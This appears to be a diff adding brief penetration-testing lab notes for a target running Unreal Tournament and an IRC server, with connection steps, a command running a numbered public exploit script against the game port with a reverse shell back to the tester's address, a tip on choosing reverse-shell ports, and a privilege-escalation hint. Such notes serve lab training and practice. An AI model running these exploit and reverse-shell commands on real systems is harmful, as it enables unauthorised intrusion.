@@ -1,0 +1,19 @@
+hexchat (irc) -> port 7778 unreal tournament
+192.168.68.44/7000
+connect to selected server only
+connect to this network automatically
+
+server -> channellist -> find * -> Simple Search 
+
+reset machine if #ut99 channel does not show
+
+
+
+exploit
+perl 16145.pl 192.168.68.44 7778 192.168.49.68 21
+
+for reverse shell ALWAYS use OPENED ports on target ALWAYS
+
+
+privesc
+fox reader unquoted service path or something, you know how it is afterwards
